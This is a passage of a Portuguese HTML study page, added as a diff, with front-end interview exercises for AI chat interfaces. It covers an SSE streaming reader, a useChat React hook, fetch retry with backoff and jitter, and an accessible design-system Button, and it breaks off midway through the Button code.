@@ -1,0 +1,859 @@
+<section class="week" id="rm8">
+  <div class="week-head"><span class="week-num">R8</span><h2>Prática: live coding e system design de IA</h2></div>
+  <div class="week-meta">~12h, em sessões de 45 min &middot; o que a entrevista pede pra você <em>fazer</em>, não pra explicar</div>
+  <p class="intro">As páginas R1&ndash;R6 ensinam a explicar. Esta treina o outro formato da entrevista: alguém te dá um enunciado e 45 minutos. São <strong>cinco exercícios de live coding</strong> tirados das frentes do roadmap (streaming, estado de chat, retry, componente de design system e Generative UI com aprovação humana) e <strong>um caso completo de front-end system design</strong>: a interface de um assistente de IA, a pergunta mais comum em vaga de Frontend com foco em IA. Cada exercício tem enunciado do jeito que o entrevistador fala, o que ele observa, dicas que você abre só se travar, solução comentada e as perguntas que vêm depois. Base teórica: <a href="r01-ai-frontend.html">R1</a> pros exercícios 1, 2, 3 e 5, <a href="r02-design-systems.html">R2</a> pro 4, e o framework RADIO do <a href="b14-frontend-system-design.html">B14</a> pro caso de system design.</p>
+
+  <h3 class="sub">Tópicos</h3>
+  <ul class="checklist">
+    <li class="item"><input type="checkbox" id="w32-1"><label for="w32-1"><span class="box"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round"><path d="M20 6L9 17l-5-5"/></svg></span><span class="txt">Exercício 1 &mdash; leitor de stream SSE feito do zero em até 40 min, sem consultar, tratando evento e caractere partidos entre pedaços</span></label></li>
+    <li class="item"><input type="checkbox" id="w32-2"><label for="w32-2"><span class="box"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round"><path d="M20 6L9 17l-5-5"/></svg></span><span class="txt">Exercício 2 &mdash; hook <code>useChat</code> com os quatro estados, parar, tentar de novo e sem condição de corrida entre requisições</span></label></li>
+    <li class="item"><input type="checkbox" id="w32-3"><label for="w32-3"><span class="box"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round"><path d="M20 6L9 17l-5-5"/></svg></span><span class="txt">Exercício 3 &mdash; <code>fetchWithRetry</code> com backoff exponencial, jitter, <code>Retry-After</code> e cancelamento que também interrompe a espera</span></label></li>
+    <li class="item"><input type="checkbox" id="w32-4"><label for="w32-4"><span class="box"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round"><path d="M20 6L9 17l-5-5"/></svg></span><span class="txt">Exercício 4 &mdash; <code>&lt;Button&gt;</code> com cva, variantes tipadas, carregamento acessível e botão só de ícone que não compila sem <code>aria-label</code></span></label></li>
+    <li class="item"><input type="checkbox" id="w32-5"><label for="w32-5"><span class="box"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round"><path d="M20 6L9 17l-5-5"/></svg></span><span class="txt">Exercício 5 &mdash; renderizar <code>parts</code> de uma resposta de IA por tipo e por estado, com cartão de aprovação humana pra ação sensível</span></label></li>
+    <li class="item"><input type="checkbox" id="w32-6"><label for="w32-6"><span class="box"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round"><path d="M20 6L9 17l-5-5"/></svg></span><span class="txt">System design &mdash; a interface de um assistente de IA em 45 min, em voz alta e gravado, cobrindo as cinco etapas do RADIO</span></label></li>
+    <li class="item"><input type="checkbox" id="w32-7"><label for="w32-7"><span class="box"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round"><path d="M20 6L9 17l-5-5"/></svg></span><span class="txt">As três variações de system design (agente de tarefa longa, autocomplete com IA, resumo com citações) em 20 min cada</span></label></li>
+  </ul>
+
+  <h3 class="sub">Como treinar</h3>
+  <div class="ex">
+    <div class="ex-body">
+      <ol>
+        <li><strong>Cronômetro e editor sem IA.</strong> Desligue o Copilot e o autocomplete de IA. Na entrevista você não vai ter, e é exatamente o músculo que esta página treina.</li>
+        <li><strong>Fale enquanto faz.</strong> Antes de escrever, repita o enunciado com suas palavras e faça 2 ou 3 perguntas de esclarecimento. O entrevistador avalia o raciocínio tanto quanto o código, e silêncio de 10 minutos é o erro mais comum.</li>
+        <li><strong>Caminho feliz primeiro, bordas depois.</strong> Faça funcionar no caso simples, diga em voz alta quais bordas vai tratar, e trate na ordem de importância. Código pela metade com um plano claro vale mais que código perfeito pela metade sem plano.</li>
+        <li><strong>Dica custa.</strong> Só abra a dica depois de 10 minutos travado, e anote que precisou dela. Se precisou, o exercício volta pra fila: refaça do zero em 3 dias e de novo em uma semana.</li>
+        <li><strong>Compare com a solução e com as perguntas de depois.</strong> A solução não é a única certa, mas cada decisão dela tem um motivo escrito. As perguntas de follow-up são onde se separa pleno de sênior.</li>
+      </ol>
+      <p><strong>O que o entrevistador anota num live coding de front-end:</strong> perguntou antes de sair codando; nomeou estados e bordas; código legível com nomes de domínio; tratou erro e cancelamento; pensou em acessibilidade sem ser lembrado; testou (nem que seja descrevendo como testaria); e soube explicar o trade-off quando provocado.</p>
+    </div>
+  </div>
+
+  <h3 class="sub">Live coding</h3>
+
+  <!-- ===================== EXERCÍCIO 1 ===================== -->
+  <div class="ex" id="ex1">
+    <div class="ex-head"><span class="ex-n">EX 1</span><h3>Ler a resposta de um LLM em streaming</h3><span class="ex-meta">40 min &middot; JS puro &middot; R1</span></div>
+    <div class="ex-body">
+      <p class="ex-enunciado">&ldquo;Nosso endpoint <code>POST /api/chat</code> devolve a resposta do modelo em Server-Sent Events: eventos <code>data: {"delta":"..."}</code> separados por linha em branco, terminando em <code>data: [DONE]</code>. Escreva <code>streamChat(prompt, { onDelta, signal })</code>: chama o endpoint, entrega cada pedaço de texto conforme chega e, no fim, diz qual foi o texto completo. Sem biblioteca.&rdquo;</p>
+      <h4>Requisitos que você deve levantar (ou perguntar)</h4>
+      <ul>
+        <li>Um pedaço da rede não respeita a fronteira de evento: um <code>data:</code> pode chegar partido em dois.</li>
+        <li>Um caractere UTF-8 de vários bytes (<code>ç</code>, <code>ã</code>, emoji) também pode chegar partido.</li>
+        <li>HTTP não-ok vira erro com o status; o chamador pode cancelar (<code>AbortSignal</code>).</li>
+        <li>Linhas que não são <code>data:</code> (comentário <code>: ping</code>, <code>event:</code>, <code>id:</code>) são ignoradas.</li>
+        <li>A conexão pode fechar sem o <code>[DONE]</code>: isso é resposta truncada, e quem chama precisa saber.</li>
+      </ul>
+      <h4>O que o entrevistador observa</h4>
+      <ul>
+        <li>Se você usa um buffer e só processa até a última fronteira completa.</li>
+        <li>Se o <code>TextDecoder</code> recebe <code>{ stream: true }</code>.</li>
+        <li>Se checa <code>response.ok</code> antes de ler, e se libera a conexão quando sai cedo (erro, <code>[DONE]</code>, abort).</li>
+      </ul>
+      <details class="dica"><summary>dica 1</summary><div class="dica-body"><p>Acumule texto num <code>buffer</code>. Divida por <code>"\n\n"</code>: todos os pedaços menos o último são eventos completos; o último volta pro buffer, porque pode estar pela metade.</p></div></details>
+      <details class="dica"><summary>dica 2</summary><div class="dica-body"><p><code>new TextDecoder().decode(bytes, { stream: true })</code> guarda os bytes de um caractere incompleto e só os entrega quando o resto chega. Sem isso, um <code>ç</code> partido vira <code>&#xFFFD;</code>. No fim, chame <code>decode()</code> sem argumentos pra esvaziar.</p></div></details>
+      <details class="dica"><summary>dica 3</summary><div class="dica-body"><p>Passe o <code>signal</code> pro <code>fetch</code>: quando abortar, o <code>reader.read()</code> pendente rejeita com <code>AbortError</code>. Num <code>finally</code>, <code>reader.cancel()</code> fecha a conexão se você saiu antes do fim do stream.</p></div></details>
+      <details class="sol"><summary>solução comentada</summary><div class="sol-body">
+<pre><code class="esc">
+export async function streamChat(prompt, { onDelta, signal } = {}) {
+  const res = await fetch('/api/chat', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', Accept: 'text/event-stream' },
+    body: JSON.stringify({ prompt }),
+    signal,
+  });
+  if (!res.ok || !res.body) throw new Error(`Falha HTTP ${res.status}`);
+
+  const reader = res.body.getReader();
+  const decoder = new TextDecoder();
+  let buffer = '';
+  let texto = '';
+
+  // processa um evento completo; devolve true quando é o [DONE]
+  function processa(evento) {
+    for (const linha of evento.split('\n')) {
+      if (!linha.startsWith('data:')) continue; // ": ping", "event:", "id:"
+      const dado = linha.slice(5).trim();
+      if (dado === '[DONE]') return true;
+      const { delta } = JSON.parse(dado);
+      texto += delta;
+      onDelta?.(delta);
+    }
+    return false;
+  }
+
+  try {
+    while (true) {
+      const { done, value } = await reader.read();
+      buffer += done ? decoder.decode() : decoder.decode(value, { stream: true });
+      const eventos = buffer.split('\n\n');
+      buffer = done ? '' : eventos.pop(); // o último pode estar pela metade
+      for (const evento of eventos) {
+        if (processa(evento)) return { texto, completo: true };
+      }
+      if (done) return { texto, completo: false }; // fechou sem [DONE]: truncada
+    }
+  } finally {
+    // saiu antes do fim (erro de parse, [DONE], abort): fecha a conexão de verdade
+    reader.cancel().catch(() => {});
+  }
+}
+</code></pre>
+<h5>Usando no botão de parar</h5>
+<pre><code class="esc">
+const ctrl = new AbortController();
+botaoParar.addEventListener('click', () => ctrl.abort());
+try {
+  const { completo } = await streamChat('Explique CSP com nonce', {
+    signal: ctrl.signal,
+    onDelta: (d) => (saida.textContent += d),
+  });
+  if (!completo) avisar('A resposta foi interrompida.');
+} catch (e) {
+  if (e.name !== 'AbortError') throw e; // abortar é escolha do usuário, não erro
+}
+</code></pre>
+<p><strong>Por que devolver <code>{ texto, completo }</code> e não só o texto:</strong> uma resposta cortada no meio parece uma resposta curta. Quem chama precisa saber a diferença pra marcar a mensagem como incompleta e oferecer &ldquo;continuar&rdquo;.</p>
+<h5>Como testar as bordas (o teste que impressiona)</h5>
+<pre><code class="esc">
+// corta a mesma resposta em TODOS os pontos possíveis: pega evento e UTF-8 partidos
+const bytes = new TextEncoder().encode(
+  'data: {"delta":"olá"}\n\ndata: {"delta":" ação"}\n\ndata: [DONE]\n\n',
+);
+for (let corte = 1; corte < bytes.length; corte++) {
+  const body = new ReadableStream({
+    start(c) { c.enqueue(bytes.slice(0, corte)); c.enqueue(bytes.slice(corte)); c.close(); },
+  });
+  vi.stubGlobal('fetch', async () => new Response(body));
+  expect(await streamChat('x')).toEqual({ texto: 'olá ação', completo: true });
+}
+</code></pre>
+      </div></details>
+      <div class="quiz">
+        <div class="quiz-head">Perguntas que vêm depois</div>
+        <ol>
+          <li>Por que não usar <code>EventSource</code>, que já faz o parse de SSE?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p><code>EventSource</code> só faz <strong>GET</strong>, sem corpo e sem header customizado (autenticação só por cookie). O prompt e o histórico precisam ir num POST, então é <code>fetch</code> + leitor. O que você perde é a reconexão automática com <code>Last-Event-ID</code>; se o produto precisar retomar stream, isso vira trabalho seu (o servidor numera os eventos e aceita &ldquo;continue a partir do id N&rdquo;).</p></div></details>
+          </li>
+          <li>A conexão caiu no meio da resposta. O que a interface faz?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Mantém o texto parcial na tela, marcado como interrompido, e oferece <strong>tentar de novo</strong> ou <strong>continuar</strong>. Apagar o que o usuário já leu é a pior opção. Se o servidor gravar a geração por id de mensagem, dá pra retomar sem pagar os tokens de novo; senão, regenerar. E vale distinguir na métrica: queda de rede, timeout do proxy e erro do modelo são causas diferentes.</p></div></details>
+          </li>
+          <li>Com respostas longas, a página engasga. Onde está o problema?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Raramente na rede. Cada <code>delta</code> vira uma atualização de estado e um re-render; se o texto passa por um parser de markdown inteiro a cada token, o custo cresce com o tamanho (o total fica quadrático). Remédio: acumular os deltas e pintar uma vez por quadro (<code>requestAnimationFrame</code>) ou com throttle de ~50 ms, e só reprocessar o último bloco de markdown. Mede-se no painel Performance e no INP enquanto o stream roda.</p></div></details>
+          </li>
+          <li>O servidor manda <code>\r\n</code> em vez de <code>\n</code>. Seu código quebra?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Quebra: a spec de SSE aceita <code>\r\n</code>, <code>\n</code> e <code>\r</code> como fim de linha, e o split por <code>"\n\n"</code> não acharia a fronteira. A correção simples é normalizar ao decodificar (<code>.replace(/\r\n?/g, '\n')</code>), com cuidado porque um <code>\r</code> pode chegar no fim de um pedaço e o <code>\n</code> no começo do outro. Bom momento pra dizer &ldquo;em produção eu usaria um parser testado, como o <code>eventsource-parser</code>; aqui escrevi à mão pra mostrar o mecanismo&rdquo;.</p></div></details>
+          </li>
+        </ol>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== EXERCÍCIO 2 ===================== -->
+  <div class="ex" id="ex2">
+    <div class="ex-head"><span class="ex-n">EX 2</span><h3>Um <code>useChat</code> simplificado</h3><span class="ex-meta">45 min &middot; React + TS &middot; R1</span></div>
+    <div class="ex-body">
+      <p class="ex-enunciado">&ldquo;Implemente um hook <code>useChat()</code> que guarda a conversa, envia a pergunta, mostra a resposta chegando em streaming e deixa o usuário parar e tentar de novo. Use o <code>streamChat</code> do exercício anterior.&rdquo;</p>
+<pre><code class="esc">
+type Status = 'ready' | 'submitted' | 'streaming' | 'error';
+type Msg = { id: string; role: 'user' | 'assistant'; text: string; incompleta?: boolean };
+
+function useChat(): {
+  messages: Msg[]; status: Status; error: Error | null;
+  send(text: string): void; stop(): void; retry(): void;
+};
+</code></pre>
+      <h4>Requisitos</h4>
+      <ul>
+        <li>A pergunta aparece na hora (otimista); <code>submitted</code> até o primeiro pedaço, <code>streaming</code> depois.</li>
+        <li><code>stop()</code> mantém o texto parcial, marcado como incompleto.</li>
+        <li>Uma requisição por vez; desmontar o componente cancela a requisição.</li>
+        <li><code>retry()</code> reenvia a última pergunta e descarta a resposta que falhou. Erro nunca apaga o histórico.</li>
+      </ul>
+      <h4>O que o entrevistador observa</h4>
+      <ul>
+        <li>Se o status é uma máquina de estados explícita, e não três booleanos (<code>isLoading</code>, <code>isStreaming</code>, <code>hasError</code>) que podem se contradizer.</li>
+        <li>Se você atualiza a mensagem com <code>setState</code> funcional e por <strong>id</strong>, não &ldquo;a última da lista&rdquo;.</li>
+        <li>Se o <code>AbortController</code> mora num <code>ref</code> e se há cleanup no unmount.</li>
+      </ul>
+      <details class="dica"><summary>dica 1</summary><div class="dica-body"><p>Gere o id da mensagem do assistente <em>antes</em> de chamar o stream. Todo delta atualiza <code>ms.map(m =&gt; m.id === id ? ... : m)</code>. Assim uma resposta antiga nunca escreve na mensagem nova.</p></div></details>
+      <details class="dica"><summary>dica 2</summary><div class="dica-body"><p>&ldquo;Está ocupado?&rdquo; pode ser lido do ref do controller (<code>ctrlRef.current !== null</code>) em vez do <code>status</code>: o ref não sofre de closure velha, e um duplo clique rápido não dispara duas requisições.</p></div></details>
+      <details class="sol"><summary>solução comentada</summary><div class="sol-body">
+<pre><code class="esc">
+import { useCallback, useEffect, useRef, useState } from 'react';
+import { streamChat } from './stream-chat';
+
+export function useChat() {
+  const [messages, setMessages] = useState<Msg[]>([]);
+  const [status, setStatus] = useState<Status>('ready');
+  const [error, setError] = useState<Error | null>(null);
+  const ctrlRef = useRef<AbortController | null>(null);
+  const messagesRef = useRef(messages);
+  useEffect(() => { messagesRef.current = messages; }, [messages]);
+
+  const run = useCallback(async (pergunta: string) => {
+    const ctrl = new AbortController();
+    ctrlRef.current = ctrl; // antes de qualquer await: bloqueia o duplo clique
+    const id = crypto.randomUUID();
+    // atualiza só a mensagem DESTA requisição
+    const patch = (fn: (m: Msg) => Msg) =>
+      setMessages((ms) => ms.map((m) => (m.id === id ? fn(m) : m)));
+
+    setError(null);
+    setStatus('submitted');
+    try {
+      let primeiro = true;
+      const { completo } = await streamChat(pergunta, {
+        signal: ctrl.signal,
+        onDelta: (delta: string) => {
+          if (primeiro) {
+            primeiro = false;
+            setStatus('streaming');
+            setMessages((ms) => [...ms, { id, role: 'assistant', text: delta }]);
+          } else {
+            patch((m) => ({ ...m, text: m.text + delta }));
+          }
+        },
+      });
+      if (completo) {
+        setStatus('ready');
+      } else {
+        patch((m) => ({ ...m, incompleta: true }));
+        setError(new Error('A resposta foi interrompida.'));
+        setStatus('error');
+      }
+    } catch (e) {
+      if (ctrl.signal.aborted) {
+        patch((m) => ({ ...m, incompleta: true })); // parar mantém o parcial
+        setStatus('ready');
+      } else {
+        setError(e as Error);
+        setStatus('error');
+      }
+    } finally {
+      if (ctrlRef.current === ctrl) ctrlRef.current = null;
+    }
+  }, []);
+
+  const send = useCallback((texto: string) => {
+    const t = texto.trim();
+    if (!t || ctrlRef.current) return; // uma requisição por vez
+    setMessages((ms) => [...ms, { id: crypto.randomUUID(), role: 'user', text: t }]);
+    void run(t);
+  }, [run]);
+
+  const retry = useCallback(() => {
+    if (ctrlRef.current) return;
+    const ms = messagesRef.current;
+    const i = ms.findLastIndex((m) => m.role === 'user');
+    if (i < 0) return;
+    setMessages(ms.slice(0, i + 1)); // descarta a resposta que falhou ou foi cortada
+    void run(ms[i].text);
+  }, [run]);
+
+  const stop = useCallback(() => ctrlRef.current?.abort(), []);
+  useEffect(() => () => ctrlRef.current?.abort(), []); // desmontou: cancela
+
+  return { messages, status, error, send, stop, retry };
+}
+</code></pre>
+<h5>O componente que usa</h5>
+<pre><code class="esc">
+function Chat() {
+  const { messages, status, error, send, stop, retry } = useChat();
+  const ocupado = status === 'submitted' || status === 'streaming';
+  return (
+    <>
+      <ol aria-label="Conversa">
+        {messages.map((m) => (
+          <li key={m.id} data-role={m.role}>
+            {m.text}
+            {m.incompleta && <em> (interrompida)</em>}
+          </li>
+        ))}
+      </ol>
+      <p role="status">{status === 'submitted' ? 'Pensando…' : ''}</p>
+      {status === 'error' && (
+        <p role="alert">
+          {error?.message ?? 'Não deu pra responder agora.'}{' '}
+          <button type="button" onClick={retry}>Tentar de novo</button>
+        </p>
+      )}
+      <form
+        onSubmit={(e) => {
+          e.preventDefault();
+          const form = e.currentTarget;
+          send(String(new FormData(form).get('q') ?? ''));
+          form.reset();
+        }}
+      >
+        <label htmlFor="q">Sua pergunta</label>
+        <input id="q" name="q" autoComplete="off" />
+        {ocupado
+          ? <button type="button" onClick={stop}>Parar</button>
+          : <button type="submit">Enviar</button>}
+      </form>
+    </>
+  );
+}
+</code></pre>
+<p><strong>Decisões pra verbalizar:</strong> o campo não é desabilitado durante a resposta (desabilitar tira o foco de quem usa teclado; o <code>send</code> já ignora envio duplicado); a região <code>role="status"</code> existe sempre na página, vazia ou não, porque leitor de tela só anuncia mudança em região que já estava lá; e a mensagem do usuário entra antes da rede responder.</p>
+      </div></details>
+      <div class="quiz">
+        <div class="quiz-head">Perguntas que vêm depois</div>
+        <ol>
+          <li>Seu <code>streamChat</code> manda só a pergunta. Como o modelo lembra da conversa?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Não lembra: a API do modelo não tem estado. O cliente manda o <code>conversationId</code> e o servidor monta o histórico a partir do banco (ou o cliente manda as mensagens, como o <code>useChat</code> do AI SDK faz). Em conversas longas o histórico estoura a janela de contexto, então o servidor corta pelas mais recentes, resume as antigas, ou busca só as relevantes. Montar no servidor também impede o cliente de forjar uma mensagem &ldquo;do assistente&rdquo;.</p></div></details>
+          </li>
+          <li>Como você testaria esse hook?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Mockando o módulo <code>stream-chat</code> com uma função controlável (que chama <code>onDelta</code> quando o teste mandar e resolve ou rejeita depois) e testando pelo componente com Testing Library: digitar, enviar, ver &ldquo;Pensando&hellip;&rdquo;, emitir um delta, ver o texto; clicar em Parar e ver &ldquo;(interrompida)&rdquo;; rejeitar e ver o botão &ldquo;Tentar de novo&rdquo;. Consultas por papel e nome (<code>getByRole('button', { name: 'Parar' })</code>), não por classe.</p></div></details>
+          </li>
+          <li>Por que não guardar a conversa num estado global (Zustand, Redux) desde o começo?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Porque, enquanto só um componente usa, estado local é mais simples e morre junto com a tela. Vira global quando outras partes precisam ler o mesmo stream (lista lateral mostrando &ldquo;respondendo&hellip;&rdquo;, título gerado da conversa) ou quando o stream precisa sobreviver a uma troca de rota. E a lista de conversas e o histórico salvo são <em>estado de servidor</em>: TanStack Query, não store de cliente (<a href="b15-react-estado.html">B15</a>).</p></div></details>
+          </li>
+        </ol>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== EXERCÍCIO 3 ===================== -->
+  <div class="ex" id="ex3">
+    <div class="ex-head"><span class="ex-n">EX 3</span><h3><code>fetchWithRetry</code> com backoff, jitter e <code>Retry-After</code></h3><span class="ex-meta">35 min &middot; TS &middot; R1/R4</span></div>
+    <div class="ex-body">
+      <p class="ex-enunciado">&ldquo;A API do modelo devolve 429 e 503 de vez em quando. Escreva <code>fetchWithRetry(url, init, opcoes)</code>: repete com backoff exponencial, respeita o <code>Retry-After</code> quando vier, não repete o que não adianta repetir, e o chamador consegue cancelar a qualquer momento &mdash; inclusive durante a espera.&rdquo;</p>
+      <h4>Requisitos</h4>
+      <ul>
+        <li>Padrões: 3 tentativas no total, base de 500 ms, teto de 8 s por espera.</li>
+        <li>Repete: erro de rede, 408, 429, 500, 502, 503, 504. Não repete: os outros 4xx, nem um abort do chamador.</li>
+        <li><code>Retry-After</code> pode vir em segundos (<code>"20"</code>) ou como data HTTP.</li>
+        <li>Esgotou as tentativas: devolve a última resposta (ou lança o último erro), pra quem chama decidir a mensagem.</li>
+      </ul>
+      <h4>O que o entrevistador observa</h4>
+      <ul>
+        <li>Se você sabe <em>por que</em> existe jitter, não só que ele existe.</li>
+        <li>Se o abort interrompe o <code>setTimeout</code> da espera (o erro clássico é o cancelamento só valer pra próxima requisição).</li>
+        <li>Se você descarta o corpo da resposta antes de tentar de novo, e o que faz quando o servidor pede pra esperar mais que o teto.</li>
+      </ul>
+      <details class="dica"><summary>dica 1</summary><div class="dica-body"><p>Full jitter: <code>Math.random() * Math.min(teto, base * 2 ** (tentativa - 1))</code>. Sem aleatoriedade, mil clientes que falharam juntos voltam juntos, no mesmo milissegundo, e derrubam o serviço de novo.</p></div></details>
+      <details class="dica"><summary>dica 2</summary><div class="dica-body"><p>A espera cancelável é uma <code>Promise</code> que resolve no <code>setTimeout</code> e rejeita no evento <code>abort</code> do signal &mdash; e cada caminho limpa o outro.</p></div></details>
+      <details class="sol"><summary>solução comentada</summary><div class="sol-body">
+<pre><code class="esc">
+const REPETIVEIS = new Set([408, 429, 500, 502, 503, 504]);
+
+type Opcoes = { tentativas?: number; baseMs?: number; tetoMs?: number };
+
+export async function fetchWithRetry(
+  url: string,
+  init: RequestInit = {},
+  { tentativas = 3, baseMs = 500, tetoMs = 8_000 }: Opcoes = {},
+): Promise<Response> {
+  // full jitter: espalha os clientes que falharam juntos
+  const backoff = (i: number) => Math.random() * Math.min(tetoMs, baseMs * 2 ** (i - 1));
+
+  for (let i = 1; ; i++) {
+    let res: Response;
+    try {
+      res = await fetch(url, init);
+    } catch (e) {
+      // abort do chamador nunca é repetido; erro de rede é, até esgotar
+      if (init.signal?.aborted || i >= tentativas) throw e;
+      await espera(backoff(i), init.signal);
+      continue;
+    }
+
+    if (res.ok || !REPETIVEIS.has(res.status) || i >= tentativas) return res;
+
+    const pedido = retryAfterMs(res.headers.get('Retry-After'));
+    // o servidor pediu mais que o teto: não adianta insistir agora.
+    // Devolve pro chamador mostrar "tente de novo em X s".
+    if (pedido !== null && pedido > tetoMs) return res;
+
+    await res.body?.cancel(); // libera a conexão antes de esperar
+    await espera(pedido ?? backoff(i), init.signal);
+  }
+}
+
+function retryAfterMs(valor: string | null): number | null {
+  if (!valor) return null;
+  const segundos = Number(valor);
+  if (Number.isFinite(segundos)) return Math.max(0, segundos * 1000);
+  const data = Date.parse(valor); // "Wed, 21 Oct 2026 07:28:00 GMT"
+  return Number.isNaN(data) ? null : Math.max(0, data - Date.now());
+}
+
+function espera(ms: number, signal?: AbortSignal | null): Promise<void> {
+  return new Promise((resolve, reject) => {
+    if (signal?.aborted) return reject(signal.reason);
+    const onAbort = () => { clearTimeout(t); reject(signal!.reason); };
+    const t = setTimeout(() => {
+      signal?.removeEventListener('abort', onAbort);
+      resolve();
+    }, ms);
+    signal?.addEventListener('abort', onAbort, { once: true });
+  });
+}
+</code></pre>
+<p><strong>Ligação com o que você já fez:</strong> é a mesma política do <code>withRetry</code> do Gabarita (<code>src/lib/ai/retry.ts</code>), que lê o <code>retryDelay</code> do corpo do 429 do Gemini em vez do header. Na entrevista, conte as duas: &ldquo;escrevi isso em produção, e aqui está a versão genérica&rdquo;.</p>
+<h5>Teste com tempo falso</h5>
+<pre><code class="esc">
+vi.useFakeTimers();
+vi.spyOn(Math, 'random').mockReturnValue(1); // backoff previsível
+const fetchMock = vi.fn()
+  .mockResolvedValueOnce(new Response(null, { status: 503 }))
+  .mockResolvedValueOnce(new Response('ok', { status: 200 }));
+vi.stubGlobal('fetch', fetchMock);
+
+const p = fetchWithRetry('/api');
+await vi.advanceTimersByTimeAsync(500);
+expect((await p).status).toBe(200);
+expect(fetchMock).toHaveBeenCalledTimes(2);
+</code></pre>
+      </div></details>
+      <div class="quiz">
+        <div class="quiz-head">Perguntas que vêm depois</div>
+        <ol>
+          <li>É seguro repetir um POST?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Depende de ele ser <strong>idempotente</strong>. Uma chamada ao LLM repetida só custa tokens; um POST que cria pagamento ou reserva pode duplicar. O padrão é o cliente mandar um <code>Idempotency-Key</code> (o mesmo em todas as tentativas) e o servidor devolver o resultado guardado quando a chave repete. Sem isso, só se repete com segurança o que a spec do HTTP já define como idempotente (GET, PUT, DELETE).</p></div></details>
+          </li>
+          <li>O retry fica no cliente ou no servidor?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>No servidor, pros erros transitórios rápidos: o usuário nem percebe. Na interface, quando as tentativas esgotam, vira um botão &ldquo;tentar de novo&rdquo;. O erro a evitar é retry automático nas duas camadas: 3 tentativas no cliente &times; 3 no servidor são até 9 chamadas ao modelo por clique, justamente quando ele está sobrecarregado (amplificação de retry).</p></div></details>
+          </li>
+          <li>Retry resolve um modelo que está fora do ar por 10 minutos?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Não, só piora a carga. Pra falha prolongada entra o <strong>circuit breaker</strong>: depois de N falhas seguidas, o circuito abre e as chamadas falham na hora por um tempo, sem bater no serviço; depois, uma chamada de teste decide se fecha. Na interface isso vira degradação explícita (&ldquo;a explicação da IA está indisponível agora&rdquo;) em vez de spinner eterno.</p></div></details>
+          </li>
+        </ol>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== EXERCÍCIO 4 ===================== -->
+  <div class="ex" id="ex4">
+    <div class="ex-head"><span class="ex-n">EX 4</span><h3>O <code>&lt;Button&gt;</code> do design system</h3><span class="ex-meta">40 min &middot; React + TS + Tailwind &middot; R2</span></div>
+    <div class="ex-body">
+      <p class="ex-enunciado">&ldquo;Crie o botão do nosso design system: variantes <code>intent</code> (primary, secondary, danger, ghost) e <code>size</code> (sm, md, lg), estado de carregamento e uma versão só com ícone. Tem que ser tipado: <code>intent="danjer"</code> não pode compilar. E acessível.&rdquo;</p>
+      <h4>Requisitos que você deve levantar</h4>
+      <ul>
+        <li><code>type="button"</code> por padrão (dentro de um <code>&lt;form&gt;</code>, o padrão do HTML é <code>submit</code>).</li>
+        <li>Carregando: não aceita clique, mas continua focável e com o mesmo nome acessível.</li>
+        <li>Só ícone: o TypeScript exige <code>aria-label</code>; o ícone fica escondido do leitor de tela.</li>
+        <li>Classes vindas de tokens semânticos (<code>bg-brand</code>), nunca de cor crua (<code>bg-orange-500</code>).</li>
+      </ul>
+      <h4>O que o entrevistador observa</h4>
+      <ul>
+        <li>Se você conhece <code>compoundVariants</code> e <code>defaultVariants</code>, e deriva o tipo com <code>VariantProps</code>.</li>
+        <li>A diferença entre <code>disabled</code> e <code>aria-disabled</code>.</li>
+        <li>Se a regra &ldquo;só ícone precisa de nome&rdquo; está no tipo, e não num comentário.</li>
+      </ul>
+      <details class="dica"><summary>dica 1</summary><div class="dica-body"><p><code>disabled</code> nativo tira o botão da ordem de tabulação: no meio de um carregamento, o foco do teclado some. <code>aria-disabled="true"</code> mantém o foco e anuncia o estado; aí é você quem bloqueia o clique no handler.</p></div></details>
+      <details class="dica"><summary>dica 2</summary><div class="dica-body"><p>Uma união discriminada resolve o caso do ícone: <code>{ children: ReactNode }</code> ou <code>{ children?: never; icon: ReactNode; 'aria-label': string }</code>.</p></div></details>
+      <details class="sol"><summary>solução comentada</summary><div class="sol-body">
+<pre><code class="esc">
+import { cva, type VariantProps } from 'class-variance-authority';
+import type { ComponentProps, ReactNode } from 'react';
+
+const button = cva(
+  'inline-flex items-center justify-center gap-2 rounded-md font-medium transition-colors ' +
+    'focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-brand ' +
+    'aria-disabled:cursor-not-allowed aria-disabled:opacity-60',
+  {
+    variants: {
+      intent: {
+        primary: 'bg-brand text-on-brand hover:bg-brand-strong',
+        secondary: 'border border-line bg-paper text-ink hover:bg-paper-sunken',
+        danger: 'bg-danger text-on-danger hover:bg-danger-strong',
+        ghost: 'bg-transparent text-ink hover:bg-paper-sunken',
+      },
+      size: { sm: 'h-8 px-3 text-sm', md: 'h-10 px-4 text-sm', lg: 'h-12 px-5 text-base' },
+      iconOnly: { true: 'px-0', false: '' },
+    },
+    // combinação de variantes: só ícone vira quadrado do tamanho certo
+    compoundVariants: [
+      { iconOnly: true, size: 'sm', className: 'w-8' },
+      { iconOnly: true, size: 'md', className: 'w-10' },
+      { iconOnly: true, size: 'lg', className: 'w-12' },
+    ],
+    defaultVariants: { intent: 'primary', size: 'md', iconOnly: false },
+  },
+);
+
+type Base = Omit<ComponentProps<'button'>, 'children'> &
+  Omit<VariantProps<typeof button>, 'iconOnly'> & { loading?: boolean };
+type ComTexto = Base & { children: ReactNode; icon?: ReactNode };
